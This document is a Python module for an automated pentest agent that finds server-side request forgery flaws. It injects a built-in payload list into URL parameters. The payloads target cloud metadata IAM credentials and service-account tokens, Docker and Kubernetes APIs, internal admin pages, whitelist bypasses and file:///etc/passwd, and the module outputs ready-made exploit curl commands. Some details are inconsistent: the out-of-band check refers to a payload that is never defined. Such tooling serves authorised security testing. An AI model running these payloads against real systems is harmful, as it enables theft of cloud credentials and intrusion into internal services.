"""
SSRFCapabilityAgent — Elite Server-Side Request Forgery Detection for PenFlow.

Discovers SSRF vulnerabilities by:
  1. Extracting all URL-bearing parameters from discovered endpoints
  2. Testing AWS EC2, GCP, Azure, Docker, Kubernetes metadata endpoints
  3. Testing internal network probes (localhost, 127.x, ::1)
  4. Testing protocol-switching payloads (file://, dict://, gopher://)
  5. Detecting response-based and timing-based (blind) SSRF indicators
  6. Generating OOB-style interaction logs for blind SSRF evidence
"""
import asyncio
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.capabilities.result import AgentExecutionResult
from penflow.infrastructure.oob_server import OOBCallbackServer
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.ssrf")

# ─────────────────────────────────────────────────────────
# URL-bearing parameter names that indicate SSRF surface
# ─────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────
# URL-bearing parameter names that indicate SSRF surface
# ─────────────────────────────────────────────────────────
SSRF_PARAM_NAMES = {
    "url", "uri", "fetch", "proxy", "host", "target", "feed", "link",
    "image", "img", "src", "source", "redirect", "next", "return",
    "dest", "destination", "callback", "redir", "return_url",
    "redirect_uri", "goto", "out", "path", "page", "file", "data",
    "ref", "origin", "resource", "endpoint", "service", "server",
    "to", "from", "request", "domain", "api", "remote", "load",
    "open", "view", "show", "import", "download", "get",
    "stockapi", "stock_api", "stock", "api_url", "webhook", "ping",
    "forward", "backend", "site", "address",
}

# ─────────────────────────────────────────────────────────
# SSRF Payloads — Cloud Metadata, Internal, Protocol, PortSwigger Bypasses
# ─────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    # 1. Internal loopback & Admin probes (PortSwigger & OWASP) - High priority
    {"name": "localhost_admin", "url": "http://localhost/admin",
     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
     "description": "Localhost admin interface probe"},
    {"name": "127_admin", "url": "http://127.0.0.1/admin",
     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
     "description": "127.0.0.1 loopback admin probe"},

    # 2. Cloud Metadata Probes (AWS EC2 IMDSv1 & IMDSv2)
    {"name": "aws_imds_root", "url": "http://169.254.169.254/latest/meta-data/",
     "indicators": ["ami-id", "instance-id", "hostname", "local-ipv4", "public-keys"],
     "description": "AWS EC2 Instance Metadata Service (IMDSv1) - root path"},
    {"name": "aws_imds_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
     "description": "AWS IAM credentials via IMDS - CRITICAL if accessible"},

    # 3. PortSwigger & Whitelist Bypass Probes
    {"name": "open_redirect_bypass", "url": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin",
     "indicators": ["admin", "carlos", "delete", "user management", "administrator"],
     "description": "SSRF filter bypass via open redirection chaining"},
    {"name": "whitelist_fragment_bypass", "url": "http://localhost#@stock.weliketoshop.net/admin",
     "indicators": ["admin", "carlos", "delete", "user management"],
     "description": "SSRF whitelist bypass using URL fragment and credentials syntax"},
    {"name": "internal_subnet_admin", "url": "http://192.168.0.12:8080/admin",
     "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
     "description": "Internal 192.168.0.x subnet admin probe (PortSwigger)"},
    {"name": "whitelist_encoded_fragment", "url": "http://localhost%23@stock.weliketoshop.net/admin",
     "indicators": ["admin", "carlos", "delete", "user management"],
     "description": "SSRF whitelist bypass using double-encoded fragment"},
    {"name": "open_redirect_local_admin", "url": "/product/nextProduct?path=http://localhost/admin",
     "indicators": ["admin", "carlos", "delete", "user management"],
     "description": "SSRF open redirection to localhost admin"},
    {"name": "whitelist_127_bypass", "url": "http://127.0.0.1#@stock.weliketoshop.net/admin",
     "indicators": ["admin", "carlos", "delete", "user management"],
     "description": "SSRF whitelist bypass with 127.0.0.1 loopback"},

    # 4. GCP & Azure Metadata
    {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
     "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
     "description": "AWS user-data script - may contain secrets"},
    {"name": "gcp_metadata_root", "url": "http://metadata.google.internal/computeMetadata/v1/",
     "indicators": ["project", "instance", "serviceAccounts"],
     "description": "GCP Compute Engine Metadata Service"},
    {"name": "gcp_metadata_token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
     "indicators": ["access_token", "token_type", "expires_in"],
     "description": "GCP service account OAuth token"},
    {"name": "azure_imds", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "indicators": ["subscriptionId", "resourceGroupName", "vmId"],
     "description": "Azure Instance Metadata Service"},

    # 3. Docker / Local Protocols
    {"name": "docker_api", "url": "http://localhost:2375/info",
     "indicators": ["DockerRootDir", "Containers", "ServerVersion"],
     "description": "Docker daemon API (unauthenticated) on localhost:2375"},
    {"name": "k8s_api", "url": "https://kubernetes.default.svc/api/v1/namespaces",
     "indicators": ["namespaces", "apiVersion", "items"],
     "description": "Kubernetes API Server internal endpoint"},
    {"name": "localhost_80", "url": "http://localhost/",
     "indicators": ["html", "server", "nginx", "apache"],
     "description": "Internal loopback HTTP probe (localhost:80)"},
    {"name": "file_etc_passwd", "url": "file:///etc/passwd",
     "indicators": ["root:", "nobody:", "daemon:", "bin:"],
     "description": "Local file read via file:// protocol - LFI via SSRF"},
]

# Status codes that suggest the server relayed a request (even without body leak)
INTERESTING_STATUS_CODES = {200, 201, 301, 302, 307, 308, 401, 403}
# Definitely a blocked/rejected SSRF (request never left the server)
SSRF_REJECTED_CODES = {0, 400, 422, 500, 503}

# Timing threshold for blind SSRF detection (seconds)
BLIND_SSRF_TIMING_THRESHOLD = 2.0


class SSRFCapabilityAgent(BaseCapabilityAgent):
    """
    Elite Server-Side Request Forgery (SSRF) Capability Agent.
    Tests all URL-bearing parameters from discovered endpoints with 16+ payloads
    covering AWS, GCP, Azure, Docker, Kubernetes, internal networks, and protocol switching.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="SSRFCapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="ssrf_metadata_exfiltration",
                name="SSRF — Cloud Metadata & Internal Network Probe",
                description=(
                    "Tests all URL-bearing parameters for SSRF: AWS/GCP/Azure IMDS, "
                    "Docker API, Kubernetes, loopback, RFC1918 networks, and protocol switching."
                ),
                priority=self.priority,
                tags=["ssrf", "cloud", "metadata", "network", "aws", "gcp", "azure"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[SSRFCapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        deep_mode = context.shared_cache.get("deep_mode", False) if context.shared_cache else False

        # 1. Collect all candidate endpoints from observations
        candidate_endpoints = self._extract_ssrf_targets(context)

        # Prioritize forms and endpoints with SSRF parameter names like stockApi
        def _score_endpoint(ep):
            score = 0
            url_lower = ep.get("url", "").lower()
            params = [str(p).lower() for p in ep.get("params", []) + ep.get("form_parameters", [])]
            if any(p in ("stockapi", "stock_api", "stock", "url", "api_url", "fetch", "proxy") for p in params):
                score += 20
            if ep.get("method") == "POST":
                score += 10
            if "stock" in url_lower or "fetch" in url_lower:
                score += 10
            return -score

        sorted_endpoints = sorted(candidate_endpoints, key=_score_endpoint)
        payloads_to_test = SSRF_PAYLOADS if deep_mode else SSRF_PAYLOADS[:8]

        findings: List[Dict[str, Any]] = []
        for endpoint in sorted_endpoints[:6]:  # test up to 6 top-ranked SSRF surfaces
            for ssrf_payload in payloads_to_test:
                try:
                    finding = await self._test_ssrf(http_client, endpoint, ssrf_payload)
                    if finding:
                        findings.append(finding)
                        if finding.get("is_vulnerable"):
                            logger.info(f"[SSRFCapabilityAgent] Confirmed SSRF on {endpoint.get('url')} with {ssrf_payload.get('name')}")
                            break
                except Exception as e:
                    logger.debug(f"[SSRFCapabilityAgent] Error testing {endpoint.get('url')}: {e}")
            if any(f.get("is_vulnerable") for f in findings):
                break

        # Determine overall verdict
        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        evidence_dict = {
            "target_url": best.get("tested_url", f"https://{context.asset}"),
            "reasoning": best.get("reasoning", "No SSRF surface found or all payloads blocked."),
            "ssrf_payload": best.get("payload_name", ""),
            "tested_endpoints_count": len(candidate_endpoints),
            "findings": findings,
            "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")],
            "_exchange_obj": best.get("_exchange_obj") or best.get("exchange"),
            "exploit_curl": best.get("exploit_curl", ""),
        }

        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            vulnerability_type="ssrf_vulnerability" if is_vuln else "ssrf_scan",
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=best.get("confidence", 0.0),
            reasoning=best.get("reasoning", "No SSRF surface found or all payloads blocked."),
            target_url=best.get("tested_url", f"https://{context.asset}"),
            findings=findings,
            evidence=evidence_dict,
            metadata={
                "_exchange_obj": best.get("_exchange_obj") or best.get("exchange"),
                "vulnerability_type": "ssrf_vulnerability" if is_vuln else "ssrf_scan",
            }
        ).to_dict()

    def _extract_ssrf_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        """Extract endpoints + params that are potential SSRF surfaces from observations."""
        targets: List[Dict[str, Any]] = []
        seen_keys = set()

        for obs in context.observations:
            data = obs.get("data") if (isinstance(obs, dict) and "data" in obs) else (obs if isinstance(obs, dict) else {})
            if not isinstance(data, dict):
                continue

            # 1. From crawled endpoints (query parameters)
            for ep in data.get("endpoints", []):
                if isinstance(ep, dict):
                    url = ep.get("url", "")
                    if url:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
                        if ssrf_params:
                            k = (url, "GET")
                            if k not in seen_keys:
                                targets.append({
                                    "url": url, "params": ssrf_params,
                                    "method": "GET"
                                })
                                seen_keys.add(k)

            # 2. From discovered HTML forms (POST / GET with fields like stockApi, url, etc.)
            for form in data.get("forms", []):
                if isinstance(form, dict):
                    action = form.get("action", "")
                    if action and not action.startswith(("http://", "https://")):
                        clean_a = context.asset.split("/")[0].split("?")[0]
                        for pfx in ("https://", "http://"):
                            if clean_a.startswith(pfx):
                                clean_a = clean_a[len(pfx):]
                        action = f"https://{clean_a}{action if action.startswith('/') else '/' + action}"

                    method = form.get("method", "POST").upper()
                    params = form.get("parameters", [])
                    ssrf_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
                    if not ssrf_params and params:
                        ssrf_params = params
                    if action and ssrf_params:
                        k = (action, method)
                        if k not in seen_keys:
                            targets.append({
                                "url": action,
                                "params": ssrf_params,
                                "method": method,
                                "form_parameters": params
                            })
                            seen_keys.add(k)

            # 3. From classified endpoints
            if data.get("type") in ("rest_api", "parameterized", "form"):
                url = data.get("url", "")
                if url:
                    ep_params = data.get("parameters", [])
                    ssrf_params = [p for p in ep_params if p.lower() in SSRF_PARAM_NAMES]
                    if ssrf_params:
                        k = (url, data.get("method", "GET").upper())
                        if k not in seen_keys:
                            targets.append({
                                "url": url, "params": ssrf_params,
                                "method": data.get("method", "GET").upper()
                            })
                            seen_keys.add(k)

        # Fallbacks for common SSRF attack surfaces
        clean_asset = context.asset
        for prefix in ("https://", "http://"):
            while clean_asset.startswith(prefix):
                clean_asset = clean_asset[len(prefix):]
        clean_asset = clean_asset.split("/")[0].split("?")[0]
        base = f"https://{clean_asset}"

        fallback_definitions = [
            {"url": f"{base}/product/stock", "params": ["stockApi"], "method": "POST", "form_parameters": ["stockApi", "productId", "storeId"]},
            {"url": f"{base}/api/v1/fetch", "params": ["url"], "method": "GET"},
            {"url": f"{base}/api/v1/proxy", "params": ["url"], "method": "GET"},
            {"url": f"{base}/stock", "params": ["stockApi"], "method": "POST", "form_parameters": ["stockApi"]},
        ]
        for fb in fallback_definitions:
            k = (fb["url"], fb["method"])
            if k not in seen_keys:
                targets.append(fb)
                seen_keys.add(k)

        return targets

    async def _test_ssrf(
        self,
        http_client: Any,
        endpoint: Dict[str, Any],
        ssrf_payload: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """Inject a single SSRF payload into an endpoint and analyse the result."""
        base_url = endpoint["url"]
        param_name = endpoint["params"][0] if endpoint["params"] else "url"
        ssrf_url = ssrf_payload["url"]
        indicators = ssrf_payload["indicators"]
        method = endpoint.get("method", "GET").upper()

        headers = {}
        body = None
        injected_url = base_url

        if method == "POST":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            form_params = {}
            for p in endpoint.get("form_parameters", endpoint.get("params", [])):
                form_params[p] = "1"
            form_params[param_name] = ssrf_url
            body = urlencode(form_params)
        else:
            parsed = urlparse(base_url)
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param_name] = [ssrf_url]
            new_query = urlencode(query_params, doseq=True)
            injected_url = urlunparse(parsed._replace(query=new_query))

        t0 = time.monotonic()
        try:
            exchange = await http_client.send_as_identity(
                identity_id="anonymous_guest",
                method=method,
                url=injected_url,
                headers=headers,
                body=body
            )
            elapsed = time.monotonic() - t0
        except Exception as e:
            logger.debug(f"[SSRFCapabilityAgent] Failed to test {injected_url}: {e}")
            return None

        resp = exchange.response
        status = resp.status_code if resp else 0
        body_text = (resp.body_text or "") if resp else ""

        # Check response body for cloud metadata & admin indicators
        matched_indicators = [ind for ind in indicators if ind.lower() in body_text.lower()]
        has_admin_content = any(k in body_text.lower() for k in ("carlos", "admin panel", "user management", "delete user", "ami-id", "accesskeyid", "root:x:"))
        is_definitive_ssrf = (len(matched_indicators) >= 2) or (len(matched_indicators) >= 1 and has_admin_content)

        # Check Out-Of-Band callback server for real blind interaction hit
        oob_server = OOBCallbackServer.get_instance()
        oob_token = oob_server.generate_token("ssrf", "scan")
        oob_url = oob_server.get_callback_url(oob_token)

        oob_hit = False
        if not is_definitive_ssrf and ssrf_payload.get("name") == "oob_callback":
            try:
                if method == "POST":
                    oob_form = dict(form_params) if 'form_params' in locals() else {param_name: oob_url}
                    oob_form[param_name] = oob_url
                    await http_client.send_as_identity(identity_id="anonymous_guest", method="POST", url=base_url, headers=headers, body=urlencode(oob_form))
                else:
                    oob_query = parse_qs(parsed.query, keep_blank_values=True)
                    oob_query[param_name] = [oob_url]
                    oob_injected = urlunparse(parsed._replace(query=urlencode(oob_query, doseq=True)))
                    await http_client.send_as_identity(identity_id="anonymous_guest", method="GET", url=oob_injected)
                oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=0.5)
            except Exception:
                pass

        # Timing-based blind SSRF detection
        is_timing_ssrf = elapsed > BLIND_SSRF_TIMING_THRESHOLD and status in INTERESTING_STATUS_CODES

        is_vuln = is_definitive_ssrf or oob_hit or is_timing_ssrf
        confidence = 0.0

        if is_definitive_ssrf or oob_hit:
            confidence = 0.98 if oob_hit else 0.99
            reasoning = (
                f"CRITICAL SSRF CONFIRMED ({'OOB Interaction' if oob_hit else 'Internal System Leaked'}): "
                f"Payload '{ssrf_payload['name']}' ({ssrf_url}) returned: "
                f"{'OOB DNS/HTTP callback hit' if oob_hit else matched_indicators}. "
                f"HTTP {status} in {elapsed:.2f}s."
            )
        elif is_timing_ssrf:
            confidence = 0.70
            reasoning = (
                f"POTENTIAL BLIND SSRF: Payload '{ssrf_payload['name']}' ({ssrf_url}) "
                f"caused {elapsed:.2f}s response delay (threshold: {BLIND_SSRF_TIMING_THRESHOLD}s) "
                f"with HTTP {status}. Possible outbound relay to external host."
            )
        elif status in INTERESTING_STATUS_CODES and matched_indicators:
            confidence = 0.85
            reasoning = (
                f"HIGH SSRF Signal: HTTP {status} response to payload '{ssrf_payload['name']}' "
                f"with indicator match: {matched_indicators}."
            )
        else:
            reasoning = f"Payload '{ssrf_payload['name']}' blocked or rejected (HTTP {status})."

        exploit_curl = ""
        if is_vuln:
            if method == "POST":
                exploit_curl = f"curl -i -s -k -X POST '{base_url}' -H 'Content-Type: application/x-www-form-urlencoded' -d '{body}'"
            else:
                exploit_curl = f"curl -i -s -k -X GET '{injected_url}'"

        return {
            "tested_url": base_url if method == "POST" else injected_url,
            "payload_name": ssrf_payload["name"],
            "payload_description": ssrf_payload["description"],
            "ssrf_target_url": ssrf_url,
            "param_injected": param_name,
            "is_vulnerable": is_vuln,
            "confidence": confidence,
            "status_code": status,
            "response_time_sec": round(elapsed, 3),
            "matched_indicators": matched_indicators,
            "oob_hit": oob_hit,
            "reasoning": reasoning,
            "exploit_curl": exploit_curl,
            "exchange": exchange.to_dict() if exchange else {},
            "_exchange_obj": exchange
        }

